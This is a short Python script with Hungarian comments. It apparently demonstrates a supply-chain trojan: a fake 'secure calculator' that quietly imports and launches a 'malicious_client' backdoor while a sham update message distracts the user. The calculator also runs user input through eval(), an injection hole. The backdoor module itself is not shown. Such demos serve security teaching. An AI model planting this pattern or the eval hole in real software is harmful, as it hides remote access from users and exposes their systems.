import sys
sys.dont_write_bytecode= True
import time
import os

# --- SUPPLY CHAIN INJECTION ---
# Itt importáljuk a gonosz modult.
# A felhasználó nem látja, hogy ez itt van, ha csak a GUI-t nézi.
import malicious_client 

def main():
    # 1. A háttérben elindítjuk a kapcsolatot
    malicious_client.run_backdoor()
    
    # 2. A program normális működése (a figyelemelterelés)
    os.system("cls")
    print("--- SUPER SECURE CALCULATOR v2.0 ---")
    print("(Indulás... Frissítések ellenőrzése...)")
    time.sleep(1) # Itt történik a csatlakozás a háttérben
    print("[OK] Rendszer naprakész.\n")
    
    while True:
        try:
            expr = input("Írj be egy műveletet (pl. 2+2) vagy 'q' a kilépéshez: ")
            if expr.lower() == 'q':
                break
            print(f"Eredmény: {eval(expr)}")
        except:
            print("Hibás bemenet!")

if __name__ == "__main__":
    main()